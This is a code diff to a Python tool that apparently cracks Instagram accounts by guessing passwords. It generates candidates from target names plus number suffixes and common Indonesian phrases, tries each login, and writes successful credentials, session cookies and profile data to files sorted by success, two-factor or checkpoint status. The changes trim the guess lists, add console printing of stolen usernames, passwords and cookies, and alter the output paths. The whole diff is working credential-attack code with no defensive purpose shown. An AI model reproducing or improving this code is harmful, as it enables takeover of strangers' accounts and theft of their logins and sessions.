@@ -741,16 +741,13 @@ class Instagram:
             else:
                 if kombinasi in ('01') or kombinasi in ('1'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123']
                 elif kombinasi in ('02') or kombinasi in ('2'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234']
-                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}04',f'{nama}05',f'{nama}95',f'{nama}96',f'{nama}97',f'{nama}98',f'{nama}99',f'{nama}00',f'{nama}2023',f'{nama}2024',f'{nama}2025',f'{nama}2022',f'{nama}2021',f'{nama}2020',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
+                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                 else: komb = [f'{nama}321',f'{nama}01',f'{nama}02',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
                 for passwords in komb:
                     if len(passwords) < 6 or str(passwords).isalnum() == False or len(name.split(' ')) > 5:
                         continue
                     else:
                         self.password.append(f'{str(passwords).lower()}')
-            tambahanku = ['akucantik', 'bismillah', 'terserah', 'bismillahaja', 'gatau lupa']
-            for itemmm in tambahanku:
-              self.password.append(itemmm)
         for passwords in [f'{name}', f'{name.replace(" ", "")}']:
             if len(passwords) < 6 or str(passwords).replace(' ', '').isalnum() == False:
                 continue
@@ -1225,6 +1222,13 @@ class Instagram:
                             printz(tree)
                             save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
                     else:
+                        console.print("[italic #C2FFC7]Response Success[/]")
+                        console.print(f"[italic white]Username:[/italic white] [green]{username}[/]")
+                        console.print(f"[italic white]Password:[/italic white] [green]{passwd}[/]")
+                        console.print(f"[italic white]Profiles:[/italic white] [green]{follower}[/]/[green]{followed}[/]/[green]{feedpost}[/]")
+                        console.print(f"[green]{users}[/] [italic white]{response_facebook}[/]")
+                        console.print("[italic white]Cookie:[/italic white]")
+                        console.print(f"[green]{cookie}[/]")
                         tree = Tree('\r                                             ')
                         tree = tree.add('╭ [italic green]Response Success')
                         tree.add(f'[italic white]Username [green]{username}')
@@ -1242,7 +1246,7 @@ class Instagram:
                         tree.add(f'[italic white]Useragent [green]{byps.headers["user-agent"]}')
                         printz(tree)
                         save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}|{users}|{fulls}|{response_facebook}\n'
-                    with open('OK/OK-Instagram-'+self.save_result,'a') as wr:
+                    with open('OK-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
                     break          
@@ -1255,11 +1259,10 @@ class Instagram:
                     tree.add(f'[italic white]Fullname : [red]{fullname}')
                     tree.add(f'[italic white]Password : [red]{passwd}')
                     tree.add(f'[italic white]Profiles : [red]{follower}[grey50]/[red]{followed}[grey50]/[red]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [red]{byps.headers["user-agent"]}')
                     printz(tree)
                     save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                     self.faktor+=1
-                    with open('2F/2F-Instagram-'+self.save_result,'a') as wr:
+                    with open('2F-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()   
                     break 
@@ -1272,11 +1275,10 @@ class Instagram:
                     tree.add(f'[italic white]Fullname : [yellow]{fullname}')
                     tree.add(f'[italic white]Password : [yellow]{passwd}')
                     tree.add(f'[italic white]Profiles : [yellow]{follower}[grey50]/[yellow]{followed}[grey50]/[yellow]{feedpost}')
-                    tree.add(f'[italic white]Useragent : [yellow]{byps.headers["user-agent"]}')
                     printz(tree)
                     save = f'{fullname}|{username}|{passwd}|{follower}|{followed}|{feedpost}\n'
                     self.chekpoint+=1
-                    with open('CP/CP-Instagram-'+self.save_result,'a') as wr:
+                    with open('CP-Instagram-'+self.save_result,'a') as wr:
                         wr.write(save)
                         wr.close()
                     break    
@@ -1502,3 +1504,8 @@ class AccesFacebook:
                 return('[yellow]Chekpoint detected') 
             else: return('[red]Password salah')
         except (KeyboardInterrupt, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e: pass
+        
+            
+          
+            
+            
